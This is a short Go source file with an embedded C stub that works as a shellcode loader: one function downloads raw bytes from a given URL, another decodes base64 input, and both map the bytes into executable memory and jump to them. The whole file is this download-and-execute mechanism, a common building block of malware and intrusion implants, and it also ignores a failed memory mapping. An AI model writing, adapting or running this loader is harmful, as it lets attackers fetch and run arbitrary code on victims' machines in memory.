package exec

/*
int call(char *code) {
    int (*ret)() = (int(*)())code;
	ret();
	return 0;
}
*/
import "C"
import (
	"bytes"
	"encoding/base64"
	"net/http"
	"time"
	"unsafe"

	mmap "github.com/edsrzf/mmap-go"
)

func GetShellcodeFromWeb(addr string) []byte {

	//buf := ""
	r, e := http.Get(addr)
	if e != nil {
		panic(e)
	}
	defer r.Body.Close()
	buff := &bytes.Buffer{}
	buff.ReadFrom(r.Body)
	body := buff.Bytes()
	return body
}

func ExecShellBytes(shellcode []byte) {
	b, e := mmap.MapRegion(nil, len(shellcode), mmap.EXEC|mmap.RDWR, mmap.ANON, int64(0))
	//b, e := syscall.Mmap(0, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON)
	if e != nil {
		//panic(e)
	}
	C.call((*C.char)(unsafe.Pointer(&b[0])))

	time.Sleep(5)
}

func ExecFromBase64(s string) error {
	b, e := base64.StdEncoding.DecodeString(s)
	if e != nil {
		return e
	}
	ExecShellBytes(b)
	return nil
}
